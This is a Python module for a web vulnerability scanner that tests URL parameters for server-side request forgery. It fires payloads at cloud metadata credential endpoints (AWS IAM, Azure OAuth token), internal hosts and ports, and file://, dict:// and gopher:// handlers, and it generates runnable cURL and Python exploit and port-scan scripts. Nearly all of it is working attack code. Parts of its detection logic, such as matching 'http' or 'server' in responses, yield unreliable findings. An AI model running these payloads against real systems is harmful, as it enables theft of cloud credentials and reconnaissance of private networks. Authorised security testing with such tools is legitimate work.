#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Detection Module
===================================================

Comprehensive Server-Side Request Forgery vulnerability detection.

Features:
- Internal network access detection
- Cloud metadata endpoint testing (AWS, GCP, Azure)
- Protocol handler testing (file://, dict://, gopher://)
- Blind SSRF detection
- Port scanning capabilities
- DNS rebinding detection
- Automated PoC generation

Author: Llakterian (llakterian@gmail.com)
License: MIT
"""

import re
import logging
import time
from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass
import requests
from urllib.parse import urlparse, quote

logger = logging.getLogger(__name__)


@dataclass
class SSRFVulnerability:
    """SSRF vulnerability data structure"""

    url: str
    parameter: str
    payload: str
    ssrf_type: str  # 'basic', 'cloud', 'blind', 'port_scan'
    target: str
    evidence: str
    severity: str
    cvss_score: float
    response_time: float
    status_code: Optional[int]
    poc_curl: str
    poc_python: str


class SSRFDetector:
    """SSRF vulnerability detection"""

    # Cloud metadata endpoints
    CLOUD_METADATA = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/project/",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token",
        ],
        "digitalocean": [
            "http://169.254.169.254/metadata/v1.json",
            "http://169.254.169.254/metadata/v1/id",
        ],
        "oracle": [
            "http://169.254.169.254/opc/v1/instance/",
            "http://169.254.169.254/opc/v2/instance/",
        ],
    }

    # Internal network targets
    INTERNAL_TARGETS = [
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://[::1]",
        "http://[0:0:0:0:0:0:0:1]",
        "http://192.168.1.1",
        "http://192.168.0.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        "http://127.0.0.1:22",  # SSH
        "http://127.0.0.1:3306",  # MySQL
        "http://127.0.0.1:5432",  # PostgreSQL
        "http://127.0.0.1:6379",  # Redis
        "http://127.0.0.1:27017",  # MongoDB
        "http://127.0.0.1:9200",  # Elasticsearch
    ]

    # Protocol handlers
    PROTOCOL_HANDLERS = [
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "file:///proc/self/environ",
        "dict://localhost:11211/stats",  # Memcached
        "gopher://localhost:25/_EHLO%20localhost",  # SMTP
        "ldap://localhost:389",
        "tftp://localhost:69",
    ]

    # SSRF indicators
    SSRF_INDICATORS = [
        "root:x:",  # /etc/passwd
        "[boot loader]",  # Windows boot.ini
        "for 16-bit app support",  # win.ini
        "instanceId",  # AWS metadata
        "accountId",  # Cloud metadata
        "serviceAccounts",  # GCP
        "computeMetadata",
        "localhost",
        "127.0.0.1",
        "instance-id",
        "ami-id",
    ]

    def __init__(self, session: requests.Session, marker: str):
        self.session = session
        self.marker = marker
        self.vulnerabilities: List[SSRFVulnerability] = []
        self.baseline_response_time = None
        self.tested_targets: Set[str] = set()

    def test_parameter(
        self, url: str, param: str, method: str = "GET"
    ) -> List[SSRFVulnerability]:
        """Test a parameter for SSRF vulnerabilities"""
        vulnerabilities = []

        # Get baseline response time
        if not self.baseline_response_time:
            self._establish_baseline(url, param, method)

        # Test internal network access
        vuln = self._test_internal_network(url, param, method)
        if vuln:
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)

        # Test cloud metadata
        vuln = self._test_cloud_metadata(url, param, method)
        if vuln:
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)

        # Test protocol handlers
        vuln = self._test_protocol_handlers(url, param, method)
        if vuln:
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)

        # Test port scanning
        vulns = self._test_port_scanning(url, param, method)
        vulnerabilities.extend(vulns)
        self.vulnerabilities.extend(vulns)

        return vulnerabilities

    def _establish_baseline(self, url: str, param: str, method: str):
        """Establish baseline response time"""
        try:
            start_time = time.time()
            if method.upper() == "GET":
                self.session.get(url, params={param: "http://example.com"}, timeout=10)
            else:
                self.session.post(url, data={param: "http://example.com"}, timeout=10)
            self.baseline_response_time = time.time() - start_time
            logger.debug(f"Baseline response time: {self.baseline_response_time:.2f}s")
        except Exception as e:
            logger.debug(f"Failed to establish baseline: {e}")
            self.baseline_response_time = 2.0  # Default

    def _test_internal_network(
        self, url: str, param: str, method: str
    ) -> Optional[SSRFVulnerability]:
        """Test internal network access"""
        for target in self.INTERNAL_TARGETS[:5]:  # Limit for speed
            try:
                start_time = time.time()

                if method.upper() == "GET":
                    response = self.session.get(url, params={param: target}, timeout=10)
                else:
                    response = self.session.post(url, data={param: target}, timeout=10)

                response_time = time.time() - start_time

                # Check for SSRF indicators
                if self._detect_ssrf(response.text, target):
                    logger.info(f"🔓 SSRF vulnerability found: {url} -> {target}")

                    poc_curl = self._generate_curl_poc(url, param, target, method)
                    poc_python = self._generate_python_poc(url, param, target, method)

                    return SSRFVulnerability(
                        url=url,
                        parameter=param,
                        payload=target,
                        ssrf_type="internal_network",
                        target=target,
                        evidence=f"Internal network access detected: {target}",
                        severity="High",
                        cvss_score=8.2,
                        response_time=response_time,
                        status_code=response.status_code,
                        poc_curl=poc_curl,
                        poc_python=poc_python,
                    )

            except Exception as e:
                logger.debug(f"Internal network test failed for {target}: {e}")

        return None

    def _test_cloud_metadata(
        self, url: str, param: str, method: str
    ) -> Optional[SSRFVulnerability]:
        """Test cloud metadata endpoint access"""
        for cloud_provider, endpoints in self.CLOUD_METADATA.items():
            for endpoint in endpoints[:2]:  # Test first 2 endpoints per provider
                try:
                    headers = {}
                    # GCP requires specific header
                    if cloud_provider == "gcp":
                        headers = {"Metadata-Flavor": "Google"}

                    start_time = time.time()

                    if method.upper() == "GET":
                        response = self.session.get(
                            url, params={param: endpoint}, headers=headers, timeout=10
                        )
                    else:
                        response = self.session.post(
                            url, data={param: endpoint}, headers=headers, timeout=10
                        )

                    response_time = time.time() - start_time

                    # Check for cloud metadata indicators
                    if self._detect_cloud_metadata(response.text, cloud_provider):
                        logger.info(
                            f"🔓 SSRF (Cloud Metadata) found: {url} -> {cloud_provider}"
                        )

                        poc_curl = self._generate_curl_poc(url, param, endpoint, method)
                        poc_python = self._generate_python_poc(
                            url, param, endpoint, method
                        )

                        return SSRFVulnerability(
                            url=url,
                            parameter=param,
                            payload=endpoint,
                            ssrf_type="cloud_metadata",
                            target=f"{cloud_provider} metadata",
                            evidence=f"Cloud metadata access ({cloud_provider}): {endpoint}",
                            severity="Critical",
                            cvss_score=9.0,
                            response_time=response_time,
                            status_code=response.status_code,
                            poc_curl=poc_curl,
                            poc_python=poc_python,
                        )

                except Exception as e:
                    logger.debug(f"Cloud metadata test failed for {endpoint}: {e}")

        return None

    def _test_protocol_handlers(
        self, url: str, param: str, method: str
    ) -> Optional[SSRFVulnerability]:
        """Test various protocol handlers"""
        for handler in self.PROTOCOL_HANDLERS[:3]:  # Test first 3
            try:
                start_time = time.time()

                if method.upper() == "GET":
                    response = self.session.get(
                        url, params={param: handler}, timeout=10
                    )
                else:
                    response = self.session.post(url, data={param: handler}, timeout=10)

                response_time = time.time() - start_time

                # Check for protocol handler success
                if self._detect_protocol_handler(response.text, handler):
                    logger.info(f"🔓 SSRF (Protocol Handler) found: {url} -> {handler}")

                    poc_curl = self._generate_curl_poc(url, param, handler, method)
                    poc_python = self._generate_python_poc(url, param, handler, method)

                    return SSRFVulnerability(
                        url=url,
                        parameter=param,
                        payload=handler,
                        ssrf_type="protocol_handler",
                        target=handler.split("://")[0],
                        evidence=f"Protocol handler access: {handler}",
                        severity="High",
                        cvss_score=8.0,
                        response_time=response_time,
                        status_code=response.status_code,
                        poc_curl=poc_curl,
                        poc_python=poc_python,
                    )

            except Exception as e:
                logger.debug(f"Protocol handler test failed for {handler}: {e}")

        return None

    def _test_port_scanning(
        self, url: str, param: str, method: str
    ) -> List[SSRFVulnerability]:
        """Test port scanning capability via SSRF"""
        vulnerabilities = []
        ports = [22, 80, 443, 3306, 5432, 6379, 8080]

        open_ports = []

        for port in ports[:4]:  # Test first 4 ports
            try:
                target = f"http://127.0.0.1:{port}"

                start_time = time.time()

                if method.upper() == "GET":
                    response = self.session.get(url, params={param: target}, timeout=5)
                else:
                    response = self.session.post(url, data={param: target}, timeout=5)

                response_time = time.time() - start_time

                # Differentiate between open and closed ports based on response time
                if self.baseline_response_time:
                    time_diff = abs(response_time - self.baseline_response_time)
                    if time_diff > 1.0:  # Significant difference
                        open_ports.append(port)

            except requests.Timeout:
                # Timeout might indicate port is open but service doesn't respond
                open_ports.append(port)
            except Exception as e:
                logger.debug(f"Port scan test failed for port {port}: {e}")

        if len(open_ports) >= 2:
            # If we can distinguish multiple ports, SSRF allows port scanning
            logger.info(f"🔓 SSRF (Port Scanning) found: {url}")

            poc_curl = self._generate_port_scan_poc(url, param, method)
            poc_python = self._generate_port_scan_poc_python(url, param, method)

            vuln = SSRFVulnerability(
                url=url,
                parameter=param,
                payload="http://127.0.0.1:[PORT]",
                ssrf_type="port_scan",
                target="localhost",
                evidence=f"Port scanning capability detected (open ports: {open_ports})",
                severity="High",
                cvss_score=7.5,
                response_time=0.0,
                status_code=None,
                poc_curl=poc_curl,
                poc_python=poc_python,
            )

            vulnerabilities.append(vuln)

        return vulnerabilities

    def _detect_ssrf(self, response_text: str, target: str) -> bool:
        """Detect SSRF indicators in response"""
        response_lower = response_text.lower()

        for indicator in self.SSRF_INDICATORS:
            if indicator.lower() in response_lower:
                return True

        # Check for localhost/127.0.0.1 in target
        if "localhost" in target or "127.0.0.1" in target:
            # Look for service banners or responses
            if any(
                x in response_lower for x in ["ssh", "mysql", "redis", "http", "server"]
            ):
                return True

        return False

    def _detect_cloud_metadata(self, response_text: str, cloud_provider: str) -> bool:
        """Detect cloud metadata in response"""
        response_lower = response_text.lower()

        cloud_indicators = {
            "aws": ["ami-id", "instance-id", "accountid", "instanceid"],
            "gcp": ["computemetadata", "serviceaccounts", "instance/", "project/"],
            "azure": ["compute", "network", "subscriptionid"],
            "digitalocean": ["droplet_id", "hostname", "region"],
            "oracle": ["instance", "vnics"],
        }

        indicators = cloud_indicators.get(cloud_provider, [])

        for indicator in indicators:
            if indicator.lower() in response_lower:
                return True

        return False

    def _detect_protocol_handler(self, response_text: str, handler: str) -> bool:
        """Detect protocol handler success"""
        protocol = handler.split("://")[0]

        if protocol == "file":
            # Check for file content indicators
            if "root:" in response_text or "[boot loader]" in response_text:
                return True
            if "for 16-bit app support" in response_text:  # win.ini
                return True

        elif protocol == "dict":
            if "STAT" in response_text or "memcached" in response_text.lower():
                return True

        elif protocol == "gopher":
            if "220" in response_text or "SMTP" in response_text:
                return True

        return False

    def _generate_curl_poc(
        self, url: str, param: str, payload: str, method: str
    ) -> str:
        """Generate cURL PoC"""
        if method.upper() == "GET":
            poc = f"""# SSRF PoC - cURL

curl -X GET "{url}?{param}={quote(payload)}" \\
  -H "User-Agent: Mozilla/5.0" \\
  --insecure \\
  -v

# Expected: Internal resource response or cloud metadata"""
        else:
            poc = f"""# SSRF PoC - cURL

curl -X POST "{url}" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "{param}={quote(payload)}" \\
  --insecure \\
  -v

# Expected: Internal resource response or cloud metadata"""

        return poc

    def _generate_python_poc(
        self, url: str, param: str, payload: str, method: str
    ) -> str:
        """Generate Python PoC"""
        poc = f'''#!/usr/bin/env python3
"""SSRF Proof of Concept"""

import requests

url = "{url}"
param = "{param}"
payload = "{payload}"

print(f"[*] Testing SSRF on: {{url}}")
print(f"[*] Target: {{payload}}")

try:
    if "{method.upper()}" == "GET":
        response = requests.get(
            url,
            params={{param: payload}},
            timeout=10,
            verify=False
        )
    else:
        response = requests.post(
            url,
            data={{param: payload}},
            timeout=10,
            verify=False
        )

    print(f"[*] Status Code: {{response.status_code}}")
    print(f"[*] Response Length: {{len(response.text)}} bytes")
    print(f"\\n[*] Response Preview:")
    print(response.text[:500])

    # Check for SSRF indicators
    if any(x in response.text.lower() for x in ['root:', 'localhost', 'instance-id']):
        print("\\n[!] SSRF CONFIRMED - Internal resource accessed!")

except Exception as e:
    print(f"[!] Error: {{e}}")
'''
        return poc

    def _generate_port_scan_poc(self, url: str, param: str, method: str) -> str:
        """Generate port scanning PoC (cURL)"""
        poc = f"""# SSRF Port Scanning PoC

# Test common ports
for port in 22 80 443 3306 5432 6379 8080 9200; do
    echo "[*] Testing port $port"
    curl -X {method} "{url}" \\
      -d "{param}=http://127.0.0.1:$port" \\
      -w "Time: %{{time_total}}s\\n" \\
      --max-time 5 \\
      --insecure
    echo "---"
done"""
        return poc

    def _generate_port_scan_poc_python(self, url: str, param: str, method: str) -> str:
        """Generate port scanning PoC (Python)"""
        poc = f'''#!/usr/bin/env python3
"""SSRF Port Scanning PoC"""

import requests
import time

url = "{url}"
param = "{param}"
ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]

print("[*] SSRF Port Scanning")
print(f"[*] Target: {{url}}")

for port in ports:
    try:
        target = f"http://127.0.0.1:{{port}}"
        print(f"\\n[*] Testing port {{port}}...")

        start = time.time()
        response = requests.{method.lower()}(
            url,
            {"data" if method.upper() == "POST" else "params"}: {{param: target}},
            timeout=5,
            verify=False
        )
        elapsed = time.time() - start

        print(f"    Status: {{response.status_code}}, Time: {{elapsed:.2f}}s")

        if response.status_code == 200:
            print(f"    [+] Port {{port}} appears OPEN")

    except requests.Timeout:
        print(f"    [+] Port {{port}} - TIMEOUT (possibly open)")
    except Exception as e:
        print(f"    [-] Port {{port}} - Error: {{e}}")
'''
        return poc

    def generate_report(self) -> Dict:
        """Generate SSRF vulnerability report"""
        return {
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerabilities": [
                {
                    "url": v.url,
                    "parameter": v.parameter,
                    "ssrf_type": v.ssrf_type,
                    "target": v.target,
                    "severity": v.severity,
                    "cvss_score": v.cvss_score,
                    "evidence": v.evidence,
                    "response_time": v.response_time,
                    "poc_available": True,
                }
                for v in self.vulnerabilities
            ],
        }
